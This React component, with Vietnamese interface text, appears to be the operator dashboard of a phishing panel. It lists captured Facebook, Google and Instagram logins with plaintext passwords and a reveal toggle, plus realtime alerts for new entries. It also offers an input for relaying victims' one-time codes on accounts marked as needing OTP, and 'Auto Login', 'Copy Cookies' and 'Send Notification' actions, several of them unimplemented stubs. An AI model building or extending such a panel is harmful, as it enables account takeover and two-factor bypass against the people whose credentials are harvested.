import React, { useState, useEffect, useCallback } from "react";
import { motion } from "framer-motion";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { useToast } from "@/components/ui/use-toast";
import { formatDistanceToNow } from "date-fns";
import { vi } from "date-fns/locale";
import {
  Chrome,
  Bot,
  RotateCcw,
  Trash2,
  Loader2,
  Copy,
  Bell,
  FilePlus,
  MoreHorizontal,
  Eye,
  EyeOff,
  MessageSquare,
} from "lucide-react";
import { loginRequestService } from "@/services/loginRequestService";
import NotificationModal from "@/pages/NotificationModal";
import CreateRequestModal from "@/components/dashboard/CreateRequestModal";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { useSupabase } from "@/contexts/BackendProvider";
import { useLoginRequests } from "@/hooks/useRealtime";
import { Input } from "@/components/ui/input";

const platformIcons = {
  Facebook:
    "https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg",
  Google:
    "https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg",
  Instagram:
    "https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png",
  default: "https://img.icons8.com/ios-glyphs/30/ffffff/globe.png",
};

const statusConfig = {
  pending: {
    label: "Chờ xử lý",
    color: "bg-yellow-500/20 text-yellow-400",
    borderColor: "border-yellow-500",
  },
  processing: {
    label: "Đang xử lý",
    color: "bg-blue-500/20 text-blue-400",
    borderColor: "border-blue-500",
  },
  success: {
    label: "Thành công",
    color: "bg-green-500/20 text-green-400",
    borderColor: "border-green-500",
  },
  failed: {
    label: "Thất bại",
    color: "bg-red-500/20 text-red-400",
    borderColor: "border-red-500",
  },
  need_otp: {
    label: "Cần OTP",
    color: "bg-cyan-500/20 text-cyan-400",
    borderColor: "border-cyan-500",
  },
  checkpoint: {
    label: "Checkpoint",
    color: "bg-orange-500/20 text-orange-400",
    borderColor: "border-orange-500",
  },
};

const ActionButton = ({ icon: Icon, text, onClick, className = "" }) => (
  <Button
    variant="glowing"
    size="sm"
    onClick={onClick}
    className={`relative rounded-full px-3 py-1 text-xs font-bold ${className}`}
  >
    <Icon className="mr-1.5 h-3 w-3" />
    {text}
  </Button>
);

const LoginRequestTable = ({ searchTerm }) => {
  const [requests, setRequests] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selectedRequest, setSelectedRequest] = useState(null);
  const [isNotificationModalOpen, setIsNotificationModalOpen] = useState(false);
  const [isCreateRequestModalOpen, setIsCreateRequestModalOpen] = useState(
    false
  );
  const [showPasswordMap, setShowPasswordMap] = useState({});
  const [otpValues, setOtpValues] = useState({});
  const { toast } = useToast();
  const { supabase } = useSupabase();
  const realtime = useLoginRequests({ showToastOnUpdate: true });

  const fetchRequests = useCallback(async () => {
    setLoading(true);
    try {
      const data = await loginRequestService.getRequests();
      setRequests(data);
    } catch (error) {
      toast({
        title: "Lỗi",
        description: "Không thể tải danh sách yêu cầu.",
        variant: "destructive",
      });
    }
    setLoading(false);
  }, [toast]);

  useEffect(() => {
    fetchRequests();

    // Setup realtime subscriptions with new backend
    realtime.on("INSERT", (payload) => {
      console.log("New login request:", payload);
      setRequests((current) => [...current, payload.data]);
      toast({
        title: "🆕 Yêu cầu mới",
        description: `${payload.data.platform} - ${payload.data.account}`,
      });
    });

    realtime.on("UPDATE", (payload) => {
      console.log("Login request updated:", payload);
      setRequests((current) =>
        current.map((req) => (req.id === payload.data.id ? payload.data : req))
      );
    });

    realtime.on("DELETE", (payload) => {
      console.log("Login request deleted:", payload);
      setRequests((current) =>
        current.filter((req) => req.id !== payload.data.id)
      );
    });

    realtime.subscribe();

    return () => {
      realtime.disconnect();
    };
  }, [fetchRequests, toast, realtime]);

  const handleAction = (action, request) => {
    toast({
      title: `🚧 ${action}`,
      description:
        "Chức năng này chưa được triển khai. Bạn có thể yêu cầu trong lần tương tác tiếp theo!",
    });
  };

  const handleTogglePasswordVisibility = (requestId) => {
    setShowPasswordMap((prev) => ({
      ...prev,
      [requestId]: !prev[requestId],
    }));
  };

  const openNotificationModal = (request) => {
    setSelectedRequest({ ...request, user: request.account }); // Adapt for NotificationModal
    setIsNotificationModalOpen(true);
  };

  const openCreateRequestModal = (request) => {
    setSelectedRequest(request);
    setIsCreateRequestModalOpen(true);
  };

  const handleOtpChange = (requestId, value) => {
    setOtpValues((prev) => ({ ...prev, [requestId]: value }));
  };

  const handleSendOtp = (requestId) => {
    const otp = otpValues[requestId];
    if (!otp || otp.length < 6) {
      toast({
        title: "Lỗi",
        description: "Vui lòng nhập mã OTP hợp lệ.",
        variant: "destructive",
      });
      return;
    }
    handleAction(
      `Gửi OTP ${otp}`,
      requests.find((r) => r.id === requestId)
    );
    // Here you would typically call a service to submit the OTP
  };

  const filteredRequests = searchTerm
    ? requests.filter(
        (req) =>
          req.account?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          req.platform?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          statusConfig[req.status]?.label
            .toLowerCase()
            .includes(searchTerm.toLowerCase())
      )
    : requests;

  if (loading)
    return (
      <div className="flex items-center justify-center h-64">
        <Loader2 className="h-8 w-8 animate-spin text-blue-500" />
      </div>
    );

  return (
    <>
      <div className="overflow-x-auto custom-scrollbar">
        <Table>
          <TableHeader>
            <TableRow className="border-slate-800 hover:bg-transparent">
              <TableHead>Nền tảng</TableHead>
              <TableHead>Tài khoản</TableHead>
              <TableHead>Mật khẩu</TableHead>
              <TableHead>Trạng thái</TableHead>
              <TableHead>Log Chi Tiết</TableHead>
              <TableHead>Lần cuối cập nhật</TableHead>
              <TableHead className="text-center">Hành động</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {filteredRequests.map((req, index) => (
              <motion.tr
                key={req.id}
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.5, delay: index * 0.05 }}
                className={`border-slate-800 hover:bg-slate-800/50 ${
                  req.status === "need_otp" || req.status === "checkpoint"
                    ? "bg-cyan-900/30"
                    : ""
                }`}
              >
                <TableCell>
                  <div className="flex items-center gap-2 font-semibold">
                    <img
                      src={platformIcons[req.platform] || platformIcons.default}
                      alt={req.platform}
                      className="h-5 w-5"
                    />
                    <span>{req.platform}</span>
                  </div>
                </TableCell>
                <TableCell className="font-mono text-sm">
                  {req.account}
                </TableCell>
                <TableCell className="font-mono text-sm">
                  <div className="flex items-center gap-2">
                    {showPasswordMap[req.id] ? req.password : "********"}
                    <Button
                      size="icon"
                      variant="ghost"
                      className="h-6 w-6 text-slate-400 hover:text-slate-200"
                      onClick={() => handleTogglePasswordVisibility(req.id)}
                    >
                      {showPasswordMap[req.id] ? (
                        <EyeOff className="h-4 w-4" />
                      ) : (
                        <Eye className="h-4 w-4" />
                      )}
                    </Button>
                  </div>
                </TableCell>
                <TableCell>
                  <Badge
                    className={`${statusConfig[req.status]?.color ||
                      ""} border ${statusConfig[req.status]?.borderColor ||
                      "border-gray-500"}`}
                  >
                    {statusConfig[req.status]?.label || req.status}
                  </Badge>
                </TableCell>
                <TableCell className="text-xs text-slate-400 max-w-[200px] truncate">
                  {req.log || "--"}
                </TableCell>
                <TableCell>
                  {formatDistanceToNow(new Date(req.last_updated), {
                    addSuffix: true,
                    locale: vi,
                  })}
                </TableCell>
                <TableCell className="text-center">
                  {req.status === "need_otp" ? (
                    <div className="flex gap-2 justify-center items-center">
                      <Input
                        type="text"
                        placeholder="Nhập OTP"
                        className="w-24 h-8 bg-slate-700 border-slate-600"
                        value={otpValues[req.id] || ""}
                        onChange={(e) =>
                          handleOtpChange(req.id, e.target.value)
                        }
                      />
                      <Button size="sm" onClick={() => handleSendOtp(req.id)}>
                        Gửi
                      </Button>
                    </div>
                  ) : (
                    <div className="flex gap-2 justify-center items-center">
                      <ActionButton
                        icon={Chrome}
                        text="Chrome"
                        onClick={() => handleAction("Mở Chrome", req)}
                      />
                      <ActionButton
                        icon={Bot}
                        text="Auto Login"
                        onClick={() => handleAction("Auto Login", req)}
                      />
                      <DropdownMenu>
                        <DropdownMenuTrigger asChild>
                          <Button
                            variant="glowing"
                            size="icon"
                            className="h-8 w-8 rounded-full"
                          >
                            <MoreHorizontal />
                          </Button>
                        </DropdownMenuTrigger>
                        <DropdownMenuContent
                          align="end"
                          className="bg-slate-800 border-slate-700 text-white"
                        >
                          <DropdownMenuItem
                            onClick={() => handleAction("Xem Cookies", req)}
                          >
                            <Copy className="mr-2 h-4 w-4" /> Sao chép Cookies
                          </DropdownMenuItem>
                          <DropdownMenuItem
                            onClick={() => openCreateRequestModal(req)}
                          >
                            <FilePlus className="mr-2 h-4 w-4" /> Tạo Yêu Cầu
                          </DropdownMenuItem>
                          <DropdownMenuItem
                            onClick={() => openNotificationModal(req)}
                          >
                            <Bell className="mr-2 h-4 w-4" /> Gửi Thông Báo
                          </DropdownMenuItem>
                          <DropdownMenuItem
                            onClick={() => handleAction("Reset", req)}
                          >
                            <RotateCcw className="mr-2 h-4 w-4" /> Reset
                          </DropdownMenuItem>
                          <DropdownMenuItem
                            onClick={() => handleAction("Delete", req)}
                            className="text-red-400 focus:bg-red-500/20 focus:text-red-300"
                          >
                            <Trash2 className="mr-2 h-4 w-4" /> Xóa
                          </DropdownMenuItem>
                        </DropdownMenuContent>
                      </DropdownMenu>
                    </div>
                  )}
                </TableCell>
              </motion.tr>
            ))}
          </TableBody>
        </Table>
      </div>

      <NotificationModal
        isOpen={isNotificationModalOpen}
        onOpenChange={setIsNotificationModalOpen}
        user={selectedRequest}
      />

      <CreateRequestModal
        isOpen={isCreateRequestModalOpen}
        onOpenChange={setIsCreateRequestModalOpen}
        request={selectedRequest}
      />
    </>
  );
};

export default LoginRequestTable;
